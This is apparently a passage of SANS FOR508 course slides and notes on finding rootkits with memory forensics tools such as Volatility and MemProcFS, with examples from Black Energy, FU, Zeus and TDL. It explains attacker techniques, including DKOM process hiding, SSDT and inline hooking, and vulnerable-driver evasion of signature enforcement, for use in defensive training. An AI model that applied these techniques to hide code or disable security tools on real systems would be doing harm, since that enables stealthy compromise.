Boot Sector, MBR/GPT, VBR

FIRMWARE & HARDWARE
UEFI, Microcontroller, Hard Drive
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Rootkits have long been feared by incident responders because they can subvert applications or the kernel to
hide processes, files, registry entries, and network connections from live response and endpoint detection tools.

.

A simple way to think about rootkit hooking is as a code detour. A malicious process or driver redirects the
logical code flow in order to manipulate user input or output. This “machine in the middle” type of attack can
ultimately provide nearly full control of the system resources and create a veil of invisibility around whatever
the rootkit wishes to hide. Memory analysis and offline disk forensics are by far the most effective ways to
detect rootkits. Code must be executed, network connections need to take place, and drivers and other files
ultimately need to be stored somewhere.
The evolution of rootkits can be collapsed into the categories seen on this slide. Some of the simplest rootkits
exist in userland, or the area of the operating system where applications and users interact. Good examples of
these include the redirection (also known as hooking) of import address table pointers of running processes and
directly patching loaded code in memory to redirect execution paths. These rootkits are less complex and less
likely to crash the system than the others, but also more vulnerable to detection by host-based security. Kernel
rootkits can subvert everything running within the operating system, often with simple changes. Modification of
critical system tables like the IDT, SSDT, and IRP can redirect code execution and attacks like direct kernel
object manipulation (DKOM) can unlink objects from legitimate lists to hide them. Microsoft has aggressively
moved to mitigate kernel rootkits via technologies like PatchGuard and Driver Signature Enforcement. The
emergence of hardware virtualization and the reduced attack surface in the kernel pushed rootkit development
towards more advanced techniques, including subversion of the entire operating system by running it in a
malicious hypervisor (often called a ”bootkit”). These virtualization attacks are the successors to some of the
early boot sector and master boot record attacks, though now much more complex. Hardware-backed security
features like TPM and secure boot technologies prevent many of these techniques and as older systems are
replaced, are very effective against this threat vector. Finally, the most recent rootkit manifestations are
firmware or hardware-based rootkits. This newest generation of rootkits seeks to limit its footprint on disk to
further complicate detection. Firmware rootkits are currently rare, very system-dependent, and typically require
more traditional rootkit techniques (like driver loading) to setup the final version, making detection still feasible.
Rootkit detection can be very difficult, but in this section, we will survey both historical and current memorybased techniques capable of detecting many advanced rootkit techniques.
138

© 2023 SANS Institute

.

138

Volatility Rootkit Detection Plugins
Volatility 2

Volatility 3

apihooks

N/A

Find userland IAT, inline, and trampoline hooks

idt

N/A

Display Interrupt Descriptor Table entries

ssdt

windows.ssdt

Display System Service Descriptor Table entries

driverirp

windows.driverirp

Identify I/O Request Packets (IRP) hooks

psxview

N/A

modules

windows.modules

View list of loaded kernel drivers

modscan

windows.modscan

Find drivers via pool tag scanning

Find hidden processes via cross-view techniques

“History never repeats itself, but it rhymes.”
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

139

.

Volatility provides a useful set of capabilities for rootkit detection via memory analysis. The apihooks plugin
focuses on userland hooking detection, including import address table (IAT) and inline function hooks. The
idt, ssdt, and driverirp plugins audit tables regularly abused by kernel-level rootkits. The psxview
plugin takes advantage of several other plugins that query process information and displays their results within a
table so inconsistencies can be visually found. This is a very powerful technique for finding hidden processes.
Finally, modules and modscan identify loaded kernel modules (drivers), allowing us to search for malicious
drivers commonly used to take control of the operating system. We have found rootkit detection capabilities in
Volatility to be most comprehensive when using version 2 of the tool. Several of the plugins have not been
ported to Volatility 3, and those that have are still providing inconsistent results. Hence you will see multiple
examples in this section still using the previous stable version, Volatility 2.
Several of the techniques discussed in this section are outmoded and focused on rootkit techniques you are
unlikely to currently see in the wild. Microsoft has made impressive gains in closing many of the doors taken
advantage of by rootkit techniques, pushing rootkits out of the kernel and deeper into the stack of hypervisor
bootkits and ultimately firmware. However, what is old often becomes new again. Hence the quote on this slide
often attributed to author Mark Twain, “History never repeats itself, but it rhymes.” The reemergence of macrobased malware and malicious LNK files as some of our most common client-side attacks should be enough
evidence to prove this point. By gaining experience with some of the classic rootkit detection mechanisms, our
hope is you will be better prepared in the future to identify similar techniques. But never fear, we will also be
following this history lesson with a discussion of driver auditing which is currently the most effective way to
identify a large percentage of modern rootkits, including those in the category of bootkits and even firmware
attacks. Rootkit analysis is not necessary in the vast majority of investigations, but the skills gained here provide
the analyst a better understanding of detections in general, and you never know, you might just be the hero who
discovers a brand new rootkit in the wild!

© 2023 SANS Institute

.

139

Rootkit Detection: ssdt

Purpose
• Display hooked functions within the System Servi ce
Descriptor table (Windows kernel hooking)

Important Parameters
• None

Investigative Notes
• The plugin displays every SSDT table entry
• Eliminate legitimate entries pointing within ntoskrnl.exe and
win32k.sys using:
| egrep –v ‘(ntoskrnl\.exe | win32k\.sys)’
• Also attempts to discover new tables added by malware
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Hooking the SSDT is a big win for malware. The kernel uses the SSDT as a lookup table for system functions,
and each table entry points to Windows API function code. An SSDT hook patches one or more of these
pointers to redirect it to a location the rootkit controls. The advantage is that it is based in the kernel and hence is
a global or system-wide hook, meaning every running application will be affected. The disadvantage is it
requires changes to the Kernel, which can risk the stability of the running system. In fact, Kernel Patch
Protection (known as PatchGuard) on 64-bit operating systems will preemptively crash the system when
anomalous changes are identified in the SSDT, IDT, and other critical kernel components. Although this doesn’t
eliminate the possibility of finding these hooks, it does greatly reduce their likelihood. There are always
countermeasures to every protection and several PatchGuard bypasses are in the wild with some samples from
the Russian Turla group as good starting points.
We can identify SSDT hooks using the Volatility plugin ssdt. Instead of only showing suspicious SSDT
entries, the plugin will print every entry in the various SSDT tables available. For each table entry, the following
is provided:
•
•
•
•

Table Entry
Function Offset
Function
Function Owner (the module that the SSDT entry is sending the request to)

There can be over 1,500 instructions available between the two default SSDT tables in Windows 10+ systems.
Luckily, there is an easy way for us to determine which instructions (if any) have been hooked. On most
standard Windows installs, every SSDT entry will point to instructions in either the system kernel (ntoskrnl.exe)
or the GUI driver (win32k.sys). Thus, our tools simply need to identify the address ranges for those two
legitimate system files and filter for any entries that do not point within them. If we ignore any SSDT entries
pointing into those two modules, any malicious drivers become readily apparent. Filtering can be easily
accomplished by piping the plugin results into the extended grep tool: egrep –v ‘(ntoskrnl\.exe | win32k\.sys)’.
Note that a small percentage of systems may load a different kernel (ntkrnlpa.exe or ntkrnlmp.exe) instead of
ntoskrnl.exe, so the egrep filter may need to be modified if you ever run into one of these edge cases.
Equivalent plugin in Volatility 3: windows.ssdt.SSDT
140

© 2023 SANS Institute

.

140

Rootkit Detection: ssdt (Black Energy 2)

Multiple SSDT hooks by driver 00004A2A

Hide Registry Keys

Injection and
Process Hiding

141

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

The Black Energy trojan is one of the earliest known examples of cyber-warfare. Its use dates to late 2008 when
it was originally employed by Russia for DDOS purposes during the Russia-Georgia conflict. An updated
version, Black Energy 2, included a rootkit for stealth and emerged during the Russian invasion of the Crimean
Peninsula (Ukraine).[1] Black Energy 3 was subsequently tied to the same Russian threat actor, targeting
Ukrainian ICS systems.
In this example, we run the Volatility ssdt plugin to audit the contents of the System Service Descriptor Tables
(SSDT). Results are redirected to a grep search function set to ignore (-v flag) any lines containing ntoskrnl.exe
or win32k.sys (known good mapped files “owning” Windows API functions). It is not unusual for SSDT tables
to have over a thousand entries, so eliminating known good items helps highlight only those suspicious entries
worth investigating. Black Energy 2 hooks fourteen functions using a driver with the curious name of
“00004A2A.” This is a hallmark of Black Energy, which is known to choose random hex values as names for
its evil driver. The next analysis step might be to perform research into the kernel functions hooked by the driver
in an attempt to determine what the malware was attempting to accomplish. Windows API functions are well
documented online, and many of the functions seen on this slide are heavily abused in the wild to facilitate
hiding of registry keys (often to hide malware persistence mechanisms), hide processes and threads from
security applications, and facilitate code injection.
Our final step would be to export that driver from the memory image for further review. This can be
accomplished using the Volatility plugins moddump (Volatility 2) or modules (Volatility 3) and will be
covered in our final step of the memory analysis process, extraction.
[1] BlackEnergy Version 2 Threat Analysis: https://for508.com/yz9ln

© 2023 SANS Institute

.

141

.
142

© 2023 SANS Institute

.

Rootkit Detection: Direct Kernel Object Manipulation

• DKOM is an advanced process hiding technique
• Unlink an EPROCESS from the doubly linked list

• Several examples exist in the wild:
• FU, Fanbot.A worm, Prolaco, DirtyMoe, Winnti
• DKOM is still active in Linux and container attacks
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

143

.

Direct Kernel Object Manipulation (DKOM) is a classic rootkit technique that inspired an entire class of attacks
against the kernel. As the name indicates, DKOM allows malware to make changes to kernel objects directly
within memory. The changes do not get written to disk, giving a very small footprint and making it very difficult
for protection mechanisms like antivirus to detect. DKOM can be used to change nearly any kernel object, but
popular attacks include unlinking objects like processes and drivers from their standard kernel lists. We see such
an attack on this slide, where DKOM has been used to unlink a process, evil.exe, from the EPROCESS doubly
linked list. Amazingly, the unlinked process will continue to run, but any standard tools for displaying running
processes will fail to identify it. Standard live response tools like tasklist.exe and Sysinternals’
pslist.exe on a live system or even the Volatility pslist plugin are defeated by DKOM. To defeat this
technique, we will need a capability like Volatility’s psscan, which does not just rely on what appears in the
various linked lists.
Although some rootkit techniques are largely theoretical, this one is not. There are many documented cases in
the wild, including the FU rootkit, Myfip.H and Fanbot.A worms, Prolaco, and DirtyMoe rootkit, which Avast
reported had infected over 100,000 systems as of 2021.[1] DKOM is largely mitigated on the latest Windows
systems by PatchGuard and especially Driver Signature Enforcement as loaded drivers are the classic way to
access kernel structures. However, it is still very viable in Linux operating systems, including containerized
environments, making this is a great reminder of how skills achieved in one discipline often carry over to other
parts of computer security.[2]
[1] DirtyMoe – Introduction and General Overview of Modularized Malware: https://for508.com/gtu49
[2] Advanced Persistent Threat Techniques Used in Container Attacks: https://for508.com/1o9b0

© 2023 SANS Institute

.

143

Rootkit Detection: psxview

Purpose
• Performs a cross-view analysis using seven different pr ocess listing
plugins to visually identify hidden processes

Important Parameters
• Limit false positives by using “known good rules” (-R)

Investigative Notes

• It is important to know the idiosyncrasies of each sour ce:
• An entry not found by pslist could be exited or hidden
• Terminated processes might show only in psscan column
• Processes run early in boot cycle like smss.exe and csrss.exe will not
show in csrss column
• Processes run before smss.exe will not show in session and deskthrd
• If using “-R”, well-known anomalies will be marked “Okay”
• Missing deskthrd & pspcid data on Win10+ systems (needs an update)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

144

.

The psxview plugin is a compound plugin that helps the analyst visually identify anomalies between plugins.
Because there are several different ways to identify processes within memory, the plugin authors decided to make it
easy to compare all of their output for easy cross-view analysis. Cross-view analysis is a simple but powerful
technique for identifying rootkits. You start a cross-view analysis by querying the system at a high level, say using
the Windows API on a live system or reading the linked lists within a memory image. Then you compare those
results with low-level data gathering, such as manually reading the Master File Table from a raw disk or scanning all
of the memory for errant process structures. If your two results differ, then that can be a sign that a rootkit is hiding
something from the high-level request. The psxview plugin cuts across many different types of memory objects,
assuming that even if a hiding technique can conceal itself from some of them, it would be very difficult to conceal
itself from all of them. The plugins run include:
•
•
•
•
•
•
•

pslist: Read the EPROCESS doubly linked list.
psscan: Scan for EPROCESS structures throughout memory.
thrdproc: Review all threads found in the memory image and collect processes using the thread parent process
identifier.
pspcid: The PspCid table is yet another kernel object that keeps track of process and thread PIDs.
csrss: The csrss.exe process keeps a handle to each process started after it (so there will be no entries for
smss.exe, the System process, and csrss.exe).
session: List of processes belonging to each logon session.
deskthrd: Identify processes via threads attached to each Windows desktop.

The psxview table has a column for each of these sources and displays a "False" for the process if it is not found in
that source or a "True" if is present. Keep in mind that various legitimate factors might cause some processes to not
be present. For instance, the csrss information is only good for processes started after csrss.exe. Thus, early system
processes like System, smss.exe, and csrss.exe process will all show as "False" in this list. Also, session and deskthrd
information are not available for smss.exe and anything started before it. Using the “-R” option is recommended, as
it will identify common false positives in the output using a built-in collection of known good rules. When such an
anomaly is discovered, it will mark that item with “Okay”. Finally, this plugin needs to be updated to fully support
Win10+. At the time of writing, deskthrd and pspcid are not populated for Win10+ memory Images.
Equivalent plugin in Volatility 3: none
144

© 2023 SANS Institute

.

Rootkit Detection: psxview (FU Rootkit)

PID 1608 (svchost.exe)
hidden via DKOM

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

145

.

The FU rootkit employs Direct Kernel Object Manipulation (DKOM) techniques to hide processes and drivers.
In this example, FU was used to hide a malicious executable named "svchost.exe" using PID 1608. Running the
psxview plugin performs comparisons similar to what a rootkit detector would do. As we see in the example,
pslist does not show PID 1608, whereas psscan, thrdproc, pspcdid, and csrss do show it as in their
process lists (three additional columns have been cut off to fit the slide). The pslist plugin should be
considered the high-level request, and as such, whenever you see something not listed there, but registered
elsewhere, it is worth looking into, as it might be an indication of rootkit activity. Keep in mind that you will see
many false positives using this tool. Common examples are terminated processes that psscan picks up, but
almost none of the other plugins have references for. An example of this behavior is seen in the csrss.exe
process with PID 868. Notice that psscan found an EPROCESS structure for that process, but none of the
other lists have any references to it. This is a classic example of a terminated process (in this case, it could be a
csrss process from a previous boot or an old session). Also, notice the “Okay” entries in the output. These are a
result of using the “-R” option and denote items that would have been labeled “False” but were checked against
a known anomaly list and are normal output for that particular plugin (and process name).
A final question to ponder is that if psscan finds the hidden process, why bother with psxview? The answer
is that without comparing and noticing that PID 1608 was present in the psscan output and not in the pslist
output, it would be easy to assume that the process was legitimate. Knowing it didn’t show up in pslist is
important!

© 2023 SANS Institute

.

145

.
146

© 2023 SANS Institute

.

Rootkit Detection: apihooks

Purpose
• Detect inline and Import Address Table function ho oks used by
rootkits to modify and control information returned

Important Parameters
• Operate only on these process IDs (-p PID)
• Skip kernel mode checks (-R)
• Scan only critical processes and dlls (-Q)

Investigative Notes

• A large number of legitimate hooks can exist; weedi ng them out
takes practice and an eye for looking for anomalies
• This plugin can take a long time to run due to the sheer number
of locations it must query—be patient!
• Supports x86 and x64 memory images
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

147

As kernel rootkit techniques like IDT and SSDT hooks became increasingly invalidated by security
improvements, attackers have turned to new methods and returned to old standbys. Userland hooks are
accomplished in user mode, not within the kernel. As such, their effects are not global. These types of hooks are
also more likely to be accomplished by legitimate applications, making malware identification more difficult.

.

Import Address Table (IAT) hooks are the simplest of rootkit techniques, requiring just a change to the address
location in a process’s IAT. Inline/trampoline hooks are similar to IAT hooks in that they both intercept process
function calls. The primary difference is that instead of manipulating the process import address table, which can
be easily identified and has some limitations, inline hooks modify the functions themselves, adding a jump (or
equivalent) to malicious code. For truly devious malware, these changes are made only on the copies in memory,
never touching the disk.
The output from the apihooks plugin can be difficult to manage. A large number of legitimate hooks exist.
Examples of legitimate hooking applications are svchost, vmtools, security tools, and codemeter/hasp copy
protection mechanisms. Focusing your analysis only on suspected processes using the "-p" option can help limit
the dataset. Brian Milliron compiled a list of Microsoft DLLs known to legitimately hook other functions in his
SANS SCORE guide to investigating rootkits.[1] Keeping these "legitimate" hooks in mind can help identify the
many false positives reported :
•
•
•
•
•
•

setupapi.dll
mswsock.dll
sfc_os.dll
adsldpc.dll
advapi32.dll
secur32.dll

•
•
•
•
•
•

ws2_32.dll
iphlpapi.dll
ntdll.dll
kernel32.dll
user32.dll
gdi32.dll

Equivalent plugin in Volatility 3: none
[1] Rootkits investigation procedures (Document): http://for508.com/64id© 2023 SANS Institute

.

147

Rootkit Detection: Zeus/Zbot Userland DLL Hooking
root@SIFT-Workstation:/# vol2.py -f zeus.img --profile=WinXPSP3x86 apihooks

Hook mode: Usermode
Hook type: Inline/Trampoline
Process: 676 (services.exe)
Victim module: USER32.dll (0x77d40000 - 0x77dd0000)
Function: USER32.dll !GetClipboardData at 0x77d6fcb2
Hook address: 0x7f4fd5
Hooking module: <unknown>
Disassembly(0):
0x77d6fcb2 e91e53a888
0x77d6fcb7 83ec2c
0x77d6fcba 56
…SNIP…

JMP 0x7f4fd5
SUB ESP, 0x2c
PUSH ESI

Zbot hooks nearly 400 DLL functions!
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Zeus malware was not designed to be stealthy—at least not to a forensic examiner armed with memory analysis
capabilities! When analyzing this Zeus infected image with the apihooks plugin, the sheer number of hooks
(nearly 400) would be a big clue that something is amiss. Also, the large number of "unknown" values for
"Hooking module" is concerning. "Hooking module" should indicate the DLL that the "JMP" instruction is
jumping into. "Unknown" means it is jumping into a memory section that is not mapped (backed with a file on
disk), indicating it might be an injected memory section. Also, notice which functions are being hooked.
Although it is of great advantage to be a Windows internals guru when looking at output like this, you don’t
have to be an expert to get an idea that a lot of very important functions have been modified. Why does the
"services.exe" process need hooks for HTTPQueryInfo and HTTPSendRequest? Or how about
GetClipboardData? With experience looking at other systems, these will start to look suspicious. The latest
version of apihooks includes multiple-hop disassembly, meaning it will follow jumps in the code and provide
sample assembly code at each step. This is not shown on the slide due to space limitations.
In this example, the code for the GetClipboardData function within USER32.dll has been patched to include an
immediate jump to offset 0x7f4fd5, which is not mapped as a library in memory and hence listed as
<unknown>. Code execution continues after the jump, but now in an attacker controller memory location.

148

© 2023 SANS Institute

.

148

Bring Your Own Vulnerable Driver Attacks

• Driver Signature Enforcement evasion:
• Force system to test signing mode
• Steal legitimate code signing certificates
• Find and abuse a vulnerable driver

• BYOVD is popular and effective
• A vulnerable driver loads further bad drivers
• Turla, Slingshot, Winnti, Trickbot, CosmicStrand

• Many use cases
• Gain kernel access to support rootkit hooks
• Remove security and EDR products
• Advanced code injection
• UEFI firmware rootkits

Figure from Microsoft Security

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

149

.

Rootkits have always comprised a very small percentage of total attacks in the wild, and Microsoft has reduced
the attack surface further during the shift to 64-bit architectures. Technologies like Kernel Patch Protection
(PatchGuard) defeat many rootkits designed to attack kernel objects like the SSDT and IDT. TPM and Secure
Boot mitigate many of the threats of bootkits. Driver Signature Enforcement (DSE) has possibly been the most
impactful by requiring all software running in kernel mode to be digitally signed. Driver digital signatures have
become even more restrictive with the latest versions of Windows server products and post-Win10 version 1607.
Drivers for these systems must be submitted to Microsoft, ultimately being part of the Microsoft root certificate
chain. Of course, there are always ways to circumvent protections and attacks have included forcing the system
into test signing mode to disable signature enforcement, stealing code signing certificates (by far the hardest of
the options), and taking advantage of flaws in existing signed drivers. The latter attack vector has surged in
popularity and has been coined “Bring Your Own Vulnerable Driver.”
Modern rootkits are more likely to take advantage of a vulnerable driver to kickstart a compromise than any
other rootkit technique.[1] Once a flawed driver is in the public domain it can be difficult to replace, and many
are orphaned but still available while just as vulnerable. A variety of drivers have been abused from well known
vendors like MSI, Gigabyte, Virtual Box, Slysoft AnyDVD, and even security products like Avast. The malware
using these drivers are some of the most feared including Derusbi, Uroburos, Slingshot, Trickbot, and
RobbinHood (the latter is shown as a slide graphic sourced from Microsoft reporting).[2] Attacks are varied, but
very commonly use a flawed driver to load a second evil (and unsigned) driver further escalating the attack.
Common targets include disabling EDR and security tools, as seen with RobbinHood, and further hooks and/or
injection to hide processes, files, registry keys, and network connections. A more advanced subset uses the
vulnerable driver to move into firmware like the UEFI rootkits of LoJax and CosmicStrand.[3]
At the risk of underplaying just how difficult rootkit detection can be, there are many opportunities to detect
these attacks. An initial exploit and dropper must be used and will often present unusual processes and network
connections to identify. In the case of BYOVD, multiple drivers will be loaded and present on the system.
Services are the most common means to load drivers and leave behind memory, event log, and registry artifacts.
In the remainder of this section, we will take on the auditing of loaded drivers.
[1] Signed kernel drivers – Unguarded gateway to Windows’ core: https://for508.com/7klnp
[2] Chip-to-cloud security against kernel attacks, Microsoft Security Blog: https://for508.com/birmk
[3] CosmicStrand: The discovery of a sophisticated UEFI firmware rootkit: https://for508.com/ymwcj
© 2023 SANS Institute

.

149

Rootkit Detection: modscan and modules

Purpose
• Walk linked list to identify kernel drivers loaded (m odules)
• Scan memory image to find loaded, unloaded, and unlinked
kernel modules (modscan plugin)

Important Parameters
• None

Investigative Notes
• Provides a list of loaded drivers, their size, and loc ation
• Drivers are a common means for malware to take control;
loading a driver gives complete access to kernel objects
• Identifying a bad driver among hundreds of others can be
hard; other information like hooks and a baseline might help
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Drivers provide the operating system kernel a means to extend its functionality. We see this most often with
hardware device drivers, which allow us to interact with various hardware-like disks, wireless network cards, or
printers. Malware can also utilize drivers to introduce code into the kernel and hence take control of the system.
This is a particularly common way that rootkits are installed.

.

The modules plugin provides the contents of the linked list identifying currently loaded drivers (also referred
to as modules). The modscan plugin scans memory for any instances of pool tags associated with memory
pages containing drivers (a deeper dive that can also identify old or unlinked drivers still present in unused parts
of memory). Both include relevant data for each driver, including name, size, and location. Sometimes, evil
drivers can be recognized immediately using this information, but often they do an excellent job of blending in
with the hundreds of other legitimate driver modules loaded on the system. Running another plugin named
devicetree might give a different view, as it provides visual information about the chaining or layering of
drivers. Another alternative is to analyze the loaded modules in conjunction with the information gathered on
hooks on the system. The two regularly go hand in hand, so comparing information from multiple plugins might
be your best bet to finding well-hidden kernel modules.
Should you find a suspicious driver, the Volatility 2 plugin moddump (windows.modules in Volatility 3)
can be used to extract the driver for more detailed analysis.
Equivalent plugins in Volatility 3: windows.modules.Modules and windows.modscan.ModScan

150

© 2023 SANS Institute

.

150

Rootkit Detection: modscan (TDL Bootkit)

A malicious driver, gaopdxserv.sys, is
present in a TDL3/TDSS-infected system
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

151

.

We use the modscan plugin in this example to identify suspicious drivers within a memory image infected with
the TDL3/TDSS rootkit.[1] Similar to other rootkit detection techniques, distinguishing bad drivers from good
drivers can be a difficult task. A modern Windows system can have hundreds of modules (drivers) loaded.
Experienced (or lucky) incident responders might immediately pick out gaopdxserv.sys in this output as a
malicious driver, but for the rest of us, we might pick out at least three or four drivers from this slide that we are
unfamiliar or uncomfortable with (and maybe 20+ from the overall list). This is where we use our standard
investigative techniques to narrow things down. One help could be using web search engines (only paying
attention to well-known, reliable sites like Microsoft TechNet). We could also compare these results against
drivers loaded on a similar system in our environment that we do not believe have been compromised.
Alternatively, the Vanilla Windows Reference project headed by Andrew Rathbun has collected clean file
listings in CSV format for a vast number of different Windows operating systems versions.[2] This kind of
"known goods" analysis is simple but very powerful. At some point, we might even decide to dump any
remaining drivers and scan them with IOCs or antivirus or perform reverse engineering.
It turns out TDSS has a documented malicious driver named "gaopdxserv.sys" (via Google), making malware
identification easy.[3] Evil drivers can sometimes be easy to spot because malware authors usually don’t expect
for them to be seen due to their rootkit cloaking capabilities. Upon finding a suspicious driver, our next step
would be to identify areas where it might have been used. Searching known hooking locations, persistence
mechanisms like services, and device/process strings for the driver name can sometimes help identify its scope
and capabilities. Note that the Volatility modules plugin will not identify gaopdxserv.sys in this sample
memory image, as it was not present in the linked list of actively loaded modules (either because of hiding
techniques or it being unloaded).
[1] The Evolution of TDL (PDF): https://for508.com/0gi13
[2] Vanilla Windows Reference Project: https://for508.com/bdjle
[3] Rootkit:W32/TDSS.gen!A: http://for508.com/y7mph

© 2023 SANS Institute

.

151

.
152

© 2023 SANS Institute

.

Data Reduction for Drivers: Memory Baseliner

16 of 175 drivers did not match the baseline image
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

153

.

We previously saw an example of Memory Baseliner being used to narrow a process list in step one of our
memory analysis process. This is a good time to bring it back to perform similar data reduction for drivers.
Identification of malicious drivers can be difficult due to the number present and the general unfamiliarity most
analysts have with normally loaded drivers. Recall that Memory Baseliner is a tool written with Volatility 3
libraries providing the capability to compare data from two memory images: a suspect image and a baseline
image. Memory Baseliner can perform baseline comparisons for four types of objects in memory: processes and
associated DLLs (-proc), drivers (-drv), and Windows services (-svc). It can also be used with pre-generated
JSON baseline files to speed analysis.
In this example, drivers were baselined using the --showknown and --imphash options. The former option shows
both items present in the baseline (KNOWN) and not present (UNKNOWN). If you are planning to output to a
CSV file for analysis, you might as well have all available information. With a good (close match) baseline
image you should typically see only a handful of new (unknown) drivers added to a given system. Focus on
these entries first, paying extra attention to path information looking for drivers loaded outside of the normal
\Windows\System32\Drivers and \Windows\System32 paths.
Import hashes (ImpHash) can be calculated for drivers present in memory and used for stricter matching by
adding the --imphash option. This option requires matching to not only be performed on full name and path, but
also on the import hash of the driver. An import hash is calculated using the names and order of API functions
imported by the driver. It is a reliable way to identify different EXE/DLL/driver variants or a malicious driver
trying to blend in. However, you should expect more “unknown” findings when using this option as it is much
more restrictive. In the example used on this slide, 16 out 175 drivers were not present in the baseline when
taking into account imphash, while only 7 drivers were not present when imphash matching was not required. In
fact, if you look at many of the unknown drivers in this example, they are clearly common drivers (e.g.,
tcpip.sys), but must be slightly different versions from those in the baseline image. If an entry does not have an
imphash, it indicates the tool was not able to extract a complete copy of the file, often caused by paging.
The item of interest identified in this example is a driver named Mnemosyne.sys located in the C:\Windows
folder. This is a non-standard driver in an unusual location. In this case, further investigation showed it to be
driver used by the F-Response security tool. One way this could be quickly determined is via stacking drivers
from many different memory images, another capability provided by Memory Baseliner. Rootkits are quite rare
© 2023 SANS Institute

.

153

.

and very unlikely to ever be found on more than a handful of systems. The path of this driver using the “\??\”
prefix is not an indication of evil. This prefix is seen from time to time and is a valid way to reference a path. It
is typically used to disable max path length limitations.

154

© 2023 SANS Institute

.

.
© 2023 SANS Institute

.

155

Living off the Land Drivers (LOLDrivers)

LOLDrivers is the resource for BYOVD research
• 320+ identified vulnerable drivers
• Threat reporting and certificate information
• Sample command lines and downloadable samples
• Sysmon configs, Sigma rules, and YARA signatures
• Complete database available in CSV and JSON

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The Bring Your Own Vulnerable (BYOVD) threat has become much larger as more research has been aimed at
the problem. What some assumed were only a handful of misused drivers exploded into a full-blown crisis as
more and more drivers were discovered and it became clear that digital signatures and driver signing
enforcement would not solve the problem. A group of researchers including Michael Haag, Jose Hernandez, and
Nasreddine Bencherchali started an incredible website to track community findings, LOLDrivers.[1]
LOLDrivers can be used during investigations to check names and hashes of drivers you might find loaded in
memory, files newly created on a system, or drivers referenced in event logs (often as new Windows Services).
It can also be used more proactively. The database is freely available, making it easy to integrate into tools
performing automated checks and threat hunting. There are pre-built Sysmon configurations, Sigma rules for
SIEM integration, and YARA signatures. If you wish to test some of these attacks, the project even archives
copies of some known vulnerable drivers. The included command lines are valuable for threat hunting through
command-line logs. This is a community driven project, so please try to share back anything you find with the
project! Microsoft technologies like Hypervisor-protected Code Integrity (HVCI or Memory Integrity) and
better enforcement of the Microsoft Vulnerable Driver Blocklist will eventually blunt much of the impact of the
threat, but it will be a long time before a majority of enterprise systems are protected.[2] Until then, you should
be thinking about how to search for vulnerable drivers in your investigations, and preferably across your
environment. The LOLDrivers project provides a great start for both tasks.
As a side note, the Elastic YARA signatures built-in to MemProcFS include over 100 signatures for vulnerable
drivers. Some existing signatures may not be as effective in memory because some sections of loaded drivers
like VersionInfo are regularly paged out. This is a place of active research, and it seems likely MemProcFS will
only get better at suspicious driver identification in future versions.
[1] LOLDrivers Project: https://for508.com/h5wtm
[2] Microsoft recommended driver block rules: https://for508.com/a24s7

156

© 2023 SANS Institute

.

156

Audit Drivers and Rootkit Detection Review
• Rootkits enable persistence and hide the existence of system
objects like processes, files, registry keys, and network artifacts
• Techniques include simple kernel or userland unlinking,
malicious drivers, and even hypervisor and firmware attacks
• Modern rootkits are most likely to be identified via initial
droppers, network activity, persistence, injection and drivers
• Volatility has multiple plugins to help identify rootkit markers:
• ssdt,idt and driverirp
• psxview
• modscan and modules
• apihooks
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

157

.

Rootkits aim to hide process, files, registry keys, and network artifacts from users and incident responders.
Not nearly as prevalent as code injection, malware rootkits can also be more difficult to identify and diagnose.
Volatility (version 2) currently includes the most robust set of memory analysis plugins to help identify
hooking and unlinking. Although we have the tools to identify rootkit hooking within our memory images, it
is one of the harder analysis steps to complete. Not only are advanced and undocumented techniques
employed, but hooking is also not solely tied to malicious activity. A host of legitimate system processes and
even protection applications like antivirus or process monitors require hooking to perform their roles. Only a
vanishingly small percentage of malware in the wild employ rootkits. For these reasons, we don’t start our
memory analysis process with rootkit detection. You are most likely to discover a rootkit via other residue left
behind like the malicious processes used to set up the rootkit (including code injection), suspicious network
connections, and unknown loaded drivers. Often by the time you reach this step, you have already discovered
some of these indicators and are just trying to identify additional information about the attack.

© 2023 SANS Institute

.

157

Step 6:
Extracting Processes, Drivers,
and Objects
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

158

© 2023 SANS Institute

.

158

Memory Resident Object Types

Process
Memory
Sections

Image
Mapped
(DLL/EXE/
SYS)

Cached File
Objects

Specialty
Objects
(MFT,
Hives)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

159

.

Throughout this section we have leveraged memory-resident data structures and taken advantage of the various
types of process memory. The final step of our memory analysis process covers object extraction from memory.
By this point in your investigation you likely have suspicious processes, DLLs, drivers, and memory sections
that could benefit from further analysis. Those will all be available for extraction. We will also introduce
capabilities for extracting more specialized items present in memory. Remember that almost everything of
interest that has ever happened on a system can be resident in RAM. Thus, we also might want the ability to
extract out cached copies of documents opened, the entire file system contents via the NTFS Master File Table,
a list of running Windows services, or even Windows registry hives. You will shortly have all of these
capabilities and more at your fingertips.

© 2023 SANS Institute

.

159

Extracting Memory Objects in MemProcFS
Process Memory
Per VAD / PTE

M:\<process>\vmemd

Private Memory

M:\<process>\heaps

Unified Process Memory

M:\<process>\minidump\minidump.dmp

Image Mapped
EXEs and DLLs

M:\<process>\modules\<module name>\pefile.dll
M:\<process>\files\(modules | vads)

Drivers

M:\name\System-4\modules\<driver name>\pefile.dll

Cached Files

M:\forensic\files

Specialty
MFT

M:\forensic\ntfs

Registry

M:\registry

Services and Tasks

M:\sys\services; M:\sys\tasks
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Extracting memory objects in MemProcFS is easy. Objects are represented as individual files and can be copied
from the mounted drive or analyzed in place. Perhaps the most challenging part is knowing where to look for
specific objects. Unsurprisingly, most process-related objects will be under the folder for that process,
